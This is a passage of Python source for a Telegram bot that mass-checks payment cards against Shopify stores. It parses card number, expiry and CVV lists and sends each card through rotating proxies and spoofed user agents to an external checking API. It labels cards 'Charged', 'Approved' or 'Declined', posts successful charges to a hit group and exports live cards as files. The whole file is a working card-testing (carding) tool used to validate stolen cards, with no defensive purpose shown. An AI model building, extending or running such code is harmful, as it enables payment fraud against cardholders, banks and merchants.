







import re
import asyncio
import aiohttp
import random
import time
import string
import io
import json
from typing import Optional, Tuple, List, Dict
from datetime import datetime
from urllib.parse import urlparse

from bin import get_bin_info
from database.db import (
    get_speed, get_user_proxies, is_premium, get_all_working_sites,
    is_gate_enabled, delete_user_proxy, delete_site,
    log_check
)
from utils.rate_limit import rate_limit
from utils.lock_check import check_lock
from logger import get_logger
from ui.emojis import PremiumEmoji as E
from ui.emojis import ButtonEmoji as BE
from config import OWNER_USERNAME, OWNER_NAME, OWNER_ID
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, LinkPreviewOptions
from telegram.ext import CallbackContext

logger = get_logger(__name__)

# Minimum time between MSH export requests per session.
MSH_EXPORT_COOLDOWN = 10




RETRY_ON_ERROR = True

API_ENDPOINTS = ["http://5.174.160.906:5000/shopii?"]
API_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json',
    'Connection': 'keep-alive',
}

HIT_DETECTION_GROUP_ID = -1003970590776
SESSION_EXPIRY_SECONDS = 300

active_mass_checks = {}
pending_mass_checks = {}

MAX_SITES_TO_TRY = 7
MAX_CARDS_LIMIT = 10000
BASE_DELAY = 0.005
REQUEST_TIMEOUT = 50
MAX_RETRIES = 2
MAX_ZERO_PRICE_RETRIES = 3


OWNER_DISPLAY_NAME = "𝑶𝑮𝑮𝒀 𝑷𝑹𝑶𝑶"

CARD_PATTERN = re.compile(
    r'(\d{13,19})\s*[|/:]\s*(\d{1,2})\s*[|/:]\s*(\d{2,4})\s*[|/:]\s*(\d{3,4})'
)
CARD_PATTERN_SPACE = re.compile(
    r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]




CHARGED_RESPONSES = [
    "ORDER_PLACED",
    "ORDER_PAID",
    "Order Confirm"
]

APPROVED_RESPONSES = [
    "INSUFFICIENT_FUNDS",
    "OTP",
    "3DS",
    "AUTHENTICATION",
    "OTP_REQUIRED"
]

DECLINED_RESPONSES = {
    "VALIDATION_CUSTOM",
    "GENERIC_ERROR",
    "DECISION_RULE_BLOCK",
    "CARD_DECLINED",
    "DECLINED",
    "PAYMENT_FAILED",
    "DO_NOT_HONOR",
    "INVALID_CARD",
    "EXPIRED_CARD",
    "PICK_UP_CARD",
    "STOLEN_CARD",
    "LOST_CARD",
    "FRAUDULENT",
    "FRAUD_SUSPECTED",
}






def mask_proxy(proxy: str) -> str:
    if not proxy:
        return "N/A"
    try:
        if '://' in proxy:
            proxy = proxy.split('://', 1)[1]
        if '@' in proxy:
            proxy = proxy.split('@', 1)[1]
        if ':' in proxy:
            host = proxy.split(':', 1)[0]
        else:
            host = proxy
        if host.endswith('.pointtoserver.com'):
            host = host.replace('.pointtoserver.com', '')
        if len(host) > 30:
            host = host[:27] + '...'
        return host
    except Exception:
        return proxy[:30] if proxy else "N/A"

def mask_site(site: str) -> str:
    if not site or site == 'N/A':
        return 'N/A'
    try:
        parsed = urlparse(site)
        domain = parsed.netloc or site
        domain = domain.replace('www.', '').replace('.myshopify.com', '')
        if len(domain) > 20:
            domain = domain[:17] + '...'
        return domain
    except Exception:
        return site[:20] + '...' if len(site) > 20 else site

def format_elapsed_short(seconds: float) -> str:
    return f"{seconds:.2f}s"

def generate_session_id(length=8):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

def format_elapsed(seconds: float) -> str:
    seconds = int(seconds)
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    secs = seconds % 60
    if hours > 0:
        return f"{hours}h {minutes}m {secs}s"
    elif minutes > 0:
        return f"{minutes}m {secs}s"
    else:
        return f"{secs}s"

def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS)

def is_decline_response(response_text: str) -> bool:
    if not response_text:
        return False
    response_upper = response_text.upper()
    for indicator in DECLINED_RESPONSES:
        if indicator in response_upper:
            return True
    return False





def is_card_expired(month: str, year: str) -> bool:
    try:
        now = datetime.now()
        if len(year) == 2:
            year_full = 2000 + int(year)
        else:
            year_full = int(year[:2]) if len(year) >= 2 else int(year)
        month_int = int(month)
        if year_full < now.year:
            return True
        if year_full == now.year and month_int < now.month:
            return True
        return False
    except Exception:
        return False

def extract_cards_from_text(text: str) -> List[str]:
    if not text:
        return []
    cards = []
    for match in CARD_PATTERN.finditer(text):
        card_number, month, year, cvv = match.groups()
        month = month.zfill(2)
        if len(year) == 4:
            year = year[2:]
        cards.append(f"{card_number}|{month}|{year}|{cvv}")
    if not cards:
        for match in CARD_PATTERN_SPACE.finditer(text):
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            cards.append(f"{card_number}|{month}|{year}|{cvv}")
    if not cards:
        for line in text.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            match = CARD_PATTERN.search(line)
            if not match:
                match = CARD_PATTERN_SPACE.search(line)
            if match:
                card_number, month, year, cvv = match.groups()
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                cards.append(f"{card_number}|{month}|{year}|{cvv}")
    seen = set()
    unique_cards = []
    expired_count = 0
    for card in cards:
        if card in seen:
            continue
        seen.add(card)
        parts = card.split('|')
        if len(parts) == 4:
            _, month, year, _ = parts
            if is_card_expired(month, year):
                expired_count += 1
                continue
        unique_cards.append(card)
    if expired_count > 0:
        logger.info(f"Filtered {expired_count} expired cards")
    return unique_cards

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return card_number, month, year, cvv
    return None





def format_result_text(result: dict, user_id: int, first_name: str, for_export: bool = False) -> str:
    elapsed = result.get('elapsed', 0)
    elapsed_str = format_elapsed_short(elapsed)
    if not result.get("success") and result.get("status_info", {}).get("status") != "Declined":
        if for_export:
            return f"""
ERROR
Card: {result.get('card', 'Unknown')}
Reason: {result.get('error', 'Unknown error')}
Time: {elapsed_str}"""
        return f"""
{E.ERROR} <b>Error Detected</b> {E.ERROR}
{E.CARD} <b>Card:</b> <code>{result.get('card', 'Unknown')}</code>
{E.RESPONSE} <b>Reason:</b> <i>{result.get('error', 'Unknown error')}</i>
{E.ELAPS} <b>Time:</b> {elapsed_str}
━━━━━━━━━━━━━━━━━━
{E.USER} ➭ <a href='tg://user?id={user_id}'>{first_name}</a> | {E.OWNER} ➭ <a href='tg://user?id={OWNER_ID}'>{OWNER_DISPLAY_NAME}</a>"""

    status_info = result.get("status_info", {"status": "Unknown", "emoji": E.ERROR})
    price = result.get('price', '0')
    brand = result.get('brand', 'N/A')
    level = result.get('level', '')
    card_type = result.get('type', '')
    issuer = result.get('issuer', 'N/A')
    country = result.get('country', 'Unknown')
    country_flag = result.get('country_flag', '')
    currency = result.get('currency', 'USD')
    masked_proxy = mask_proxy(result.get('proxy', ''))

    brand_display = brand
    if level:
        brand_display += f" {level}"
    if card_type:
        brand_display += f" {card_type}"
    try:
        price_float = float(re.sub(r'[^\d.]', '', price))
        price_display = f"${price_float:.2f}"
    except:
        price_display = f"${price}"

    if for_export:
        return f"""
STATUS: {status_info['status']} {status_info['emoji']}
Card: {result['card']}
Response: {result.get('response', '')}
Gateway: {result.get('gateway', 'Shopify')} {price_display}
BIN: {result['card'].split('|')[0][:6]}
Bank: {issuer}
Brand: {brand_display}
Country: {country_flag} {country}
Time: {elapsed_str}"""

    return f"""
<b>STATUS ➜ {status_info['status']} {status_info['emoji']}</b>
━━━━━━━━━━━━━━━━━━
{E.CARD} <b>Card  ➭ </b><code>{result['card']}</code>
{E.RESPONSE} <b>Response  ➭ </b><code>{result.get('response', '')} </code>
{E.GATE} <b>Gateway  ➭ </b>{result.get('gateway', 'Shopify')} • {price_display} {currency}
━━━━━━━━━━━━━━━━━━
<blockquote><b>Bank:</b> {issuer}
<b>Brand:</b> {brand_display}
<b>Country:</b> {country_flag} {country}
{E.ELAPS} ➭ {elapsed_str} | {E.PX} ➭ {masked_proxy}</blockquote>
━━━━━━━━━━━━━━━━━━
{E.USER} ➭ <a href='tg://user?id={user_id}'>{first_name}</a> | {E.OWNER} ➭ <a href='tg://user?id={OWNER_ID}'>{OWNER_DISPLAY_NAME}</a>
"""





def format_card_compact(card: dict) -> str:
    card_num = card.get('card', 'Unknown')
    response = card.get('response', 'No response')
    status_info = card.get('status_info', {})
    status = status_info.get('status', '')

    if status == 'Error':
        error_msg = card.get('error')
        if error_msg and error_msg != 'No response':
            response = error_msg

    price = card.get('price', '0')
    currency = card.get('currency', 'USD')
    gateway = card.get('gateway', 'Shopify')
    if gateway.lower() in ('shopify', 'shopify payments'):
        gateway = 'Autoshopii'

    try:
        price_val = float(re.sub(r'[^\d.]', '', price))
        price_str = f"{price_val:.2f} {currency}".strip()
    except:
        price_str = f"{price} {currency}".strip()

    if not response:
        response = 'No response'

    base = f"{card_num} ➔ {response} • {price_str} | Gtw: {gateway}"

    if status == 'Error':
        site = card.get('site')
        if site:
            masked_site = mask_site(site)
            base += f" | Site: {masked_site}"

    return base

def generate_export_file(cards: list, title: str, card_type: str) -> io.BytesIO:
    charged = []
    approved = []
    threed = []
    declined = []
    errors = []

    for card in cards:
        status_info = card.get('status_info', {})
        status = status_info.get('status', '')
        response = card.get('response', '')

        if status == 'Charged':
            charged.append(card)
        elif status == 'Declined':
            declined.append(card)
        elif status == 'Error':
            errors.append(card)
        elif status == 'Approved':
            resp_upper = response.upper()
            if any(x in resp_upper for x in ('3D', 'OTP', 'AUTHENTICATION', '3DS')):
                threed.append(card)
            else:
                approved.append(card)
        else:
            errors.append(card)

    lines = []
    lines.append(f"{title.upper()} CARDS")
    lines.append("=" * 50)
    lines.append("")

    def add_category(label, emoji, card_list):
        if not card_list:
            return
        lines.append(f"{emoji} {label}")
        lines.append("=" * 40)
        for card in card_list:
            lines.append(format_card_compact(card))
        lines.append("")

    add_category("CHARGED CARDS", "💎", charged)
    add_category("LIVE / APPROVED (Low Funds)", "✅", approved)
    add_category("3D SECURE REQUIRED", "🔐", threed)
    add_category("DECLINED CARDS", "❌", declined)
    add_category("ERRORS", "⚠️", errors)

    content = "\n".join(lines)
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"{title.replace(' ', '_')}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
    return file

def generate_session_summary(stats: dict, session_id: str, user_id: int, first_name: str) -> io.BytesIO:
    all_cards = (stats.get('charged_cards', []) +
                 stats.get('approved_cards', []) +
                 stats.get('declined_cards', []) +
                 stats.get('error_cards', []))
    title = f"Session_{session_id}"
    return generate_export_file(all_cards, title, "all")





def format_progress(stats: dict, session_id: str, is_stopped: bool = False, is_done: bool = False) -> str:
    total = stats.get("total", 0)
    checked = stats.get("checked", 0)
    charged = stats.get("charged", 0)
    approved = stats.get("approved", 0)
    declined = stats.get("declined", 0)
    error = stats.get("error", 0)
    user_id = stats.get("user_id", 0)
    first_name = stats.get("first_name", "User")
    speed = stats.get("speed", 10)
    percentage = min((checked / total * 100), 100) if total > 0 else 0
    if is_stopped:
        status_text = f"{E.CLOSE} Stopped"
    elif is_done:
        status_text = f"{E.SUCCESS} Completed"
    else:
        status_text = f"{E.LOAD} Processing"
    if is_done or is_stopped:
        elapsed_text = format_elapsed(stats.get('end_time', 0) - stats.get('start_time', 0))
    else:
        elapsed_text = format_elapsed(time.time() - stats.get('start_time', time.time()))
    return f"""
⌠ Status ➠ {status_text} ⌡
━━━━━━━━━━━━━━━━━━━━━━━━━━
Gateway ➠ {E.GATE} Shopify
Total ➠ {checked}/{total} ({percentage:.0f}%)
{E.get_charge_emoji()} Charged ➭ {charged}
{E.APPROVED} Approved ➭ {approved}
{E.DECLINED} Declined ➭ {declined}
{E.ERROR} Errors ➭ {error}
{E.CLOCK} Time ➭ {elapsed_text}
━━━━━━━━━━━━━━━━━━
{E.USER} User ➭ {first_name}
{E.DEV} Dev ➠ @{OWNER_USERNAME}"""





def get_control_buttons(session_id: str, is_active: bool = True) -> InlineKeyboardMarkup:
    stats = active_mass_checks.get(session_id, {}).get("stats", {})
    approved = stats.get('approved', 0)
    total = stats.get('total', 0)
    buttons = []
    row1 = [
        InlineKeyboardButton(
            text=f"Approve ({approved})",
            callback_data=f"msh_export_approved_{session_id}",
            style="success",
            icon_custom_emoji_id=BE.APPROVED
        ),
        InlineKeyboardButton(
            text=f"All ({total})",
            callback_data=f"msh_export_all_{session_id}",
            style="primary",
            icon_custom_emoji_id=BE.VIEW
        ),
    ]
    buttons.append(row1)
    row2 = []
    if is_active:
        row2.append(
            InlineKeyboardButton(
                text="Stop",
                callback_data=f"msh_stop_{session_id}",
                style="danger",
                icon_custom_emoji_id=BE.CLOSE_EMOJI
            )
        )
    else:
        row2.append(
            InlineKeyboardButton(
                text="Close",
                callback_data="ignore",
                style="primary",
                icon_custom_emoji_id=BE.CLOSE_EMOJI
            )
        )
    buttons.append(row2)
    return InlineKeyboardMarkup(buttons)





async def export_cards(query, session_id: str, card_type: str):
    logger.info(f"Export triggered: {card_type} | Session: {session_id}")
    session_data = active_mass_checks.get(session_id)
    if not session_data:
        await query.answer("⏰ Session expired. Please start a new mass check.", show_alert=True)
        return

    now = time.time()
    last_export_time = session_data.get("last_export_time", 0.0)
    remaining = MSH_EXPORT_COOLDOWN - (now - last_export_time)
    if remaining > 0:
        seconds = max(1, int(remaining + 0.999))
        await query.answer(
            f"⏳ Export is rate-limited. Please wait {seconds} seconds before using the export buttons again.",
            show_alert=True
        )
        return

    session_data["last_export_time"] = now
    session_data["exporting"] = True

    try:
        stats = session_data.get("stats", {})
        if card_type == "approved":
            cards = stats.get("approved_cards", [])
            display_name = "Approved"
        elif card_type == "all":
            cards = (stats.get("charged_cards", []) + stats.get("approved_cards", []) +
                     stats.get("declined_cards", []) + stats.get("error_cards", []))
            display_name = "All"
        else:
            cards = []
            display_name = card_type.capitalize()
        count = len(cards)
        if count == 0:
            alert_msg = f"⚠️ No {display_name.lower()} cards found." if card_type != "all" else "⚠️ No cards found to export."
            await query.answer(alert_msg, show_alert=True)
            return
        title = f"{display_name.upper()}_CARDS"
        file = generate_export_file(cards, title, card_type)
        try:
            await query.message.reply_document(
                document=file,
                caption=f"📄 {display_name} cards: {count}"
            )
            await query.answer(f"✅ {count} {display_name.lower()} cards exported!", show_alert=False)
        except Exception as e:
            logger.error(f"Export error: {e}")
            await query.answer("❌ Failed to send file.", show_alert=True)
        finally:
            file.close()
    finally:
        session_data["exporting"] = False

async def stop_mass_session(query, session_id: str):
    session_data = active_mass_checks.get(session_id)
    if not session_data:
        await query.answer("⏰ Session expired. Please start a new mass check.", show_alert=True)
        return
    session_data["stopped"] = True
    stop_event = session_data.get("stop_event")
    if stop_event:
        stop_event.set()
    for task in session_data.get("workers", []):
        if not task.done():
            task.cancel()
    session_data["completed"] = True
    session_data["completed_at"] = time.time()
    session_data["stats"]["end_time"] = time.time()
    await query.answer("🛑 Mass check stopped!", show_alert=False)
    try:
        await query.edit_message_text(
            format_progress(session_data["stats"], session_id, is_stopped=True, is_done=False),
            parse_mode="HTML",
            reply_markup=get_control_buttons(session_id, is_active=False)
        )
    except Exception as e:
        if "Message is not modified" not in str(e):
            logger.error(f"Stop error: {e}")





async def _do_request(card_details: str, site: str, proxy: str) -> dict:
    params = {'cc': card_details, 'site': site, 'proxy': proxy}
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': 'application/json',
        'Connection': 'keep-alive'
    }
    async with aiohttp.ClientSession() as session:
        async with session.get(API_ENDPOINTS[0], params=params, timeout=REQUEST_TIMEOUT, headers=headers) as resp:
            text = await resp.text()
            try:
                data = json.loads(text)
            except json.JSONDecodeError:
                raise Exception(f"Invalid JSON response: {text[:100]}")
            return data

def process_shopii_response(data: dict, card_details: str, site: str, proxy: str,
                            start_time: float, brand: str, level: str, card_type: str,
                            issuer: str, country: str, country_flag: str, currency: str,
                            user_id: int) -> dict:
    api_status = data.get("Status", False)
    response_text = data.get("Response", "")
    price = data.get("Price", "0")
    gateway = data.get("Gateway", "Shopify")
    currency = data.get("Currency") or currency
    proxy_status = data.get("Proxy", "live")
    elapsed = time.time() - start_time

    if proxy_status == "dead":
        logger.warning(f"API marked proxy {proxy} as dead for user {user_id}")
        delete_user_proxy(proxy, user_id)

    if "DEAD_STORE" in response_text:
        logger.warning(f"Site {site} is dead (DEAD_STORE), deleting")
        delete_site(site)

    status_info = None
    error_msg = None

    if any(phrase in response_text for phrase in CHARGED_RESPONSES):
        status_info = {"status": "Charged", "emoji": E.get_charge_emoji()}
    elif any(phrase in response_text for phrase in APPROVED_RESPONSES):
        status_info = {"status": "Approved", "emoji": E.APPROVED}
    elif is_decline_response(response_text):
        status_info = {"status": "Declined", "emoji": E.DECLINED}
    else:
        status_info = {"status": "Error", "emoji": E.ERROR}
        error_msg = response_text or "Unknown error"

    log_check(user_id=user_id, card=card_details, status=status_info['status'],
              message=response_text, gateway=gateway, time_taken=elapsed)

    result = {
        "success": api_status,
        "card": card_details,
        "response": response_text,
        "gateway": gateway,
        "price": price,
        "brand": brand,
        "level": level,
        "type": card_type,
        "issuer": issuer,
        "country": country,
        "country_flag": country_flag,
        "currency": currency,
        "site": site,
        "proxy": proxy,
        "status_info": status_info,
        "elapsed": elapsed,
    }
    if error_msg is not None:
        result["error"] = error_msg

    return result

async def check_single_card(
    card_details: str,
    user_id: int,
    proxies: List[str],
    sites_data: List[dict],
) -> dict:
    parsed = parse_card_details(card_details)
    if not parsed:
        return {
            "success": False,
            "error": "Invalid card format",
            "card": card_details,
            "currency": "USD",
            "country": "Unknown",
            "country_flag": "",
            "elapsed": 0.0,
            "type": "error",
            "status_info": {"status": "Error", "emoji": E.ERROR},
        }
    card_number, month, year, cvv = parsed
    bin_info = await get_bin_info(card_number[:6])
    brand = (bin_info.get("scheme") or "N/A").title()
    level = bin_info.get("level") or "N/A"
    card_type = bin_info.get("type") or "N/A"
    issuer = bin_info.get("bank") or "N/A"
    currency = bin_info.get("currency") or "USD"
    country = bin_info.get("country") or "Unknown"
    country_flag = bin_info.get("country_emoji", "")
    formatted = f"{card_number}|{month}|{year}|{cvv}"

    if not sites_data:
        error_msg = "No working sites found"
        logger.error(f"❌ {error_msg} for card {card_details}")
        return {
            "success": False,
            "error": error_msg,
            "card": card_details,
            "currency": currency,
            "country": country,
            "country_flag": country_flag,
            "elapsed": 0.0,
            "type": "error",
            "status_info": {"status": "Error", "emoji": E.ERROR},
        }
    if not proxies:
        error_msg = "No proxies available"
        logger.error(f"❌ {error_msg} for card {card_details}")
        return {
            "success": False,
            "error": error_msg,
            "card": card_details,
            "currency": currency,
            "country": country,
            "country_flag": country_flag,
            "elapsed": 0.0,
            "type": "error",
            "status_info": {"status": "Error", "emoji": E.ERROR},
        }

    start_time = time.time()
    available_sites = [s["url"] for s in sites_data]
    random.shuffle(available_sites)
    available_proxies = proxies.copy()
    random.shuffle(available_proxies)

    if not RETRY_ON_ERROR:
        site = random.choice(available_sites)
        proxy = random.choice(available_proxies)
        try:
            data = await _do_request(formatted, site, proxy)
            return process_shopii_response(
                data, formatted, site, proxy, start_time,
                brand, level, card_type, issuer, country, country_flag, currency, user_id
            )
        except Exception as e:
            elapsed = time.time() - start_time
            error_msg = str(e) or "Unknown network error"
            logger.error(f"Single attempt failed for {card_details} | site={site} | proxy={proxy} | error={error_msg}")
            return {
                "success": False,
                "error": error_msg,
                "card": card_details,
                "elapsed": elapsed,
                "type": "error",
                "status_info": {"status": "Error", "emoji": E.ERROR},
                "site": site,
                "proxy": proxy,
                "response": None,
                "currency": currency,
                "country": country,
                "country_flag": country_flag,
            }

    retry_count = 0
    last_error = None
    last_site = None
    last_proxy = None
    last_response = None
    zero_price_retries = 0
    max_zero_price_retries = MAX_ZERO_PRICE_RETRIES

    for attempt in range(MAX_RETRIES * 3 + max_zero_price_retries):
        if retry_count >= MAX_RETRIES and zero_price_retries >= max_zero_price_retries:
            break
        if attempt < len(available_sites):
            site = available_sites[attempt % len(available_sites)]
        else:
            site = random.choice(available_sites)
        last_site = site
        if attempt < len(available_proxies):
            proxy = available_proxies[attempt % len(available_proxies)]
        else:
            proxy = random.choice(proxies)
        last_proxy = proxy

        logger.debug(f"Attempt {attempt+1}: Checking {card_details} on {site} via {proxy}")
        try:
            data = await _do_request(formatted, site, proxy)
            result = process_shopii_response(
                data, formatted, site, proxy, start_time,
                brand, level, card_type, issuer, country, country_flag, currency, user_id
            )
            last_response = result.get("response", "")

            if result["status_info"]["status"] in ("Charged", "Approved", "Declined"):
                return result

            if result["status_info"]["status"] == "Error":
                if "DEAD_STORE" in result.get("response", ""):
                    available_sites = [s for s in available_sites if s != site]
                    retry_count += 1
                    continue
                if data.get("Proxy") == "dead":
                    available_proxies = [p for p in available_proxies if p != proxy]
                    retry_count += 1
                    continue
                return result

            try:
                price_float = float(result.get("price", "0"))
            except:
                price_float = 0.0
            if price_float == 0.0 and zero_price_retries < max_zero_price_retries:
                zero_price_retries += 1
                logger.debug(f"Zero price for {card_details}, retry {zero_price_retries}/{max_zero_price_retries} (site={site}, proxy={proxy})")
                if len(available_sites) > 1:
                    available_sites = [s for s in available_sites if s != site]
                retry_count += 1
                continue

            return result

        except asyncio.TimeoutError:
            last_error = "Timeout"
            logger.error(f"Timeout on {site}, proxy {proxy} for {card_details}")
            retry_count += 1
            continue
        except Exception as e:
            last_error = str(e) or "Unknown error"
            logger.error(f"Exception on {site}, proxy {proxy} for {card_details}: {e}")
            retry_count += 1
            continue

    elapsed = time.time() - start_time
    log_check(user_id=user_id, card=card_details, status="Error",
              message=last_error or "All attempts failed", gateway="Shopify", time_taken=elapsed)
    logger.error(f"❌ All attempts failed for {card_details}, last_site={last_site}, last_proxy={last_proxy}, error={last_error}")
    return {
        "success": False,
        "error": last_error or "All attempts failed",
        "card": card_details,
        "elapsed": elapsed,
        "type": "error",
        "status_info": {"status": "Error", "emoji": E.ERROR},
        "site": last_site,
        "proxy": last_proxy,
        "response": last_response,
        "currency": currency,
        "country": country,
        "country_flag": country_flag,
    }





async def process_mass_check(cards: List[str], user_id: int, include_approved: bool, update: Update, context: CallbackContext):
    session_id = generate_session_id()
    first_name = update.effective_user.first_name
    username = update.effective_user.username
    start_time = time.time()
    total_cards = len(cards)
    logger.info(f"MSH Session: {total_cards} cards | User: {user_id}")
    speed = get_speed()
    if speed < 1:
        speed = 10
    stats = {
        "total": total_cards,
        "checked": 0,
        "charged": 0,
        "approved": 0,
        "declined": 0,
        "error": 0,
        "charged_cards": [],
        "approved_cards": [],
        "declined_cards": [],
        "error_cards": [],
        "start_time": start_time,
        "end_time": 0,
        "user_id": user_id,
        "first_name": first_name,
        "speed": speed,
    }
    progress = await update.message.reply_text(
        format_progress(stats, session_id, is_stopped=False, is_done=False),
        parse_mode="HTML",
        reply_markup=get_control_buttons(session_id, is_active=True),
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )
    active_mass_checks[session_id] = {
        "user_id": user_id,
        "message_id": progress.message_id,
        "chat_id": progress.chat_id,
        "stats": stats,
        "stopped": False,
        "stop_event": asyncio.Event(),
        "workers": [],
        "last_progress_update": 0,
        "last_progress_text": None,
        "first_name": first_name,
        "username": username,
        "context": context,
        "completed": False,
        "completed_at": None,
        "session_id": session_id,
        "recheck_errors": False,
        "exporting": False,
        "last_export_time": 0.0,
    }
    proxies_data = get_user_proxies(user_id)
    proxy_strings = [p["proxy"] for p in proxies_data if p.get("status") == "active"]
    if not proxy_strings:
        proxy_strings = [p["proxy"] for p in proxies_data]
    logger.info(f"Proxies: {len(proxy_strings)}")
    sites_data = get_all_working_sites()
    if not sites_data:
        await progress.edit_text("No working sites found. Please add sites.")
        return
    logger.info(f"Sites: {len(sites_data)}")
    semaphore = asyncio.Semaphore(speed)
    logger.info(f"Speed: {speed} concurrent cards")

    async def check_one(card: str, index: int):
        session_data = active_mass_checks.get(session_id)
        if not session_data or session_data.get("stopped"):
            return
        async with semaphore:
            await asyncio.sleep(BASE_DELAY)
            result = await check_single_card(
                card_details=card,
                user_id=user_id,
                proxies=proxy_strings,
                sites_data=sites_data,
            )
            session_data = active_mass_checks.get(session_id)
            if not session_data or session_data.get("stopped"):
                return
            stat = session_data["stats"]
            ctx = session_data.get("context")
            status_info = result.get("status_info", {})
            status = status_info.get("status", "")
            if status == "Charged":
                stat["charged"] += 1
                stat["charged_cards"].append(result)
                formatted = format_result_text(result, user_id, first_name)
                sent_msg = await ctx.bot.send_message(
                    user_id,
                    formatted,
                    parse_mode="HTML",
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
                try:
                    await ctx.bot.pin_chat_message(chat_id=user_id, message_id=sent_msg.message_id)
                except Exception as e:
                    logger.error(f"Failed to pin message: {e}")
                try:
                    hit_text, hit_keyboard = format_hit_message(result, user_id, username, first_name)
                    await ctx.bot.send_message(HIT_DETECTION_GROUP_ID, hit_text, parse_mode="HTML", reply_markup=hit_keyboard, link_preview_options=LinkPreviewOptions(is_disabled=True))
                except Exception as e:
                    logger.error(f"Hit detection error: {e}")
            elif status == "Approved":
                stat["approved"] += 1
                stat["approved_cards"].append(result)
            elif status == "Declined":
                stat["declined"] += 1
                stat["declined_cards"].append(result)
            else:
                stat["error"] += 1
                error_entry = {
                    "card": card,
                    "error": result.get("error", result.get("response", "Unknown status")),
                    "response": result.get("response", ""),
                    "status_info": {"status": "Error", "emoji": E.ERROR},
                    "site": result.get("site"),
                    "proxy": result.get("proxy"),
                    "currency": result.get("currency", "USD"),
                    "country": result.get("country", "Unknown"),
                    "country_flag": result.get("country_flag", ""),
                }
                if not error_entry["error"]:
                    error_entry["error"] = "Unknown error (no response)"
                stat["error_cards"].append(error_entry)
                logger.error(f"❌ Error card {card} | site={result.get('site')} | proxy={result.get('proxy')} | error={result.get('error', result.get('response'))}")
            stat["checked"] += 1
            if stat["checked"] % 20 == 0 or stat["checked"] == stat["total"]:
                current_time = time.time()
                last_update = session_data.get("last_progress_update", 0)
                if current_time - last_update > 2:
                    session_data["last_progress_update"] = current_time
                    new_text = format_progress(stat, session_id, is_stopped=False, is_done=False)
                    last_text = session_data.get("last_progress_text")
                    if new_text != last_text and not session_data.get("exporting", False):
                        session_data["last_progress_text"] = new_text
                        try:
                            await progress.edit_text(
                                new_text,
                                parse_mode="HTML",
                                reply_markup=get_control_buttons(session_id, is_active=True),
                                link_preview_options=LinkPreviewOptions(is_disabled=True)
                            )
                        except Exception as e:
                            if "Message is not modified" not in str(e):
                                logger.error(f"Progress update error: {e}")

    logger.info(f"Creating {total_cards} tasks...")
    tasks = []
    for i, card in enumerate(cards):
        if active_mass_checks[session_id].get("stopped"):
            break
        task = asyncio.create_task(check_one(card, i))
        tasks.append(task)
        active_mass_checks[session_id]["workers"].append(task)
    logger.info(f"Waiting for {len(tasks)} tasks...")
    await asyncio.gather(*tasks, return_exceptions=True)
    logger.info("All tasks completed!")

    session_data = active_mass_checks.get(session_id)
    if session_data:
        stats["end_time"] = time.time()
        session_data["completed"] = True
        session_data["completed_at"] = time.time()

        if RETRY_ON_ERROR:
            error_cards = stats.get("error_cards", [])
            if error_cards and not session_data.get("recheck_errors", False):
                logger.info(f"Auto-rechecking {len(error_cards)} error cards in same session...")
                session_data["recheck_errors"] = True
                cards_to_recheck = []
                for c in error_cards:
                    if isinstance(c, dict):
                        card = c.get("card")
                        if card:
                            cards_to_recheck.append(card)
                    elif isinstance(c, str):
                        cards_to_recheck.append(c)
                if cards_to_recheck:
                    stats["error_cards"] = []
                    stats["error"] = 0
                    stats["total"] = total_cards + len(cards_to_recheck)
                    logger.info(f"Rechecking {len(cards_to_recheck)} cards...")
                    recheck_tasks = []
                    for i, card in enumerate(cards_to_recheck):
                        if active_mass_checks[session_id].get("stopped"):
                            break
                        task = asyncio.create_task(check_one(card, i + total_cards))
                        recheck_tasks.append(task)
                        active_mass_checks[session_id]["workers"].append(task)
                    await asyncio.gather(*recheck_tasks, return_exceptions=True)
                    logger.info("Recheck completed!")


        summary_file = generate_session_summary(stats, session_id, user_id, first_name)
        try:
            await context.bot.send_document(
                chat_id=user_id,
                document=summary_file,
                caption=None
            )
            summary_file.close()
        except Exception as e:
            logger.error(f"Failed to send summary: {e}")
        try:
            if session_data.get("stopped"):
                await progress.edit_text(
                    format_progress(stats, session_id, is_stopped=True, is_done=False),
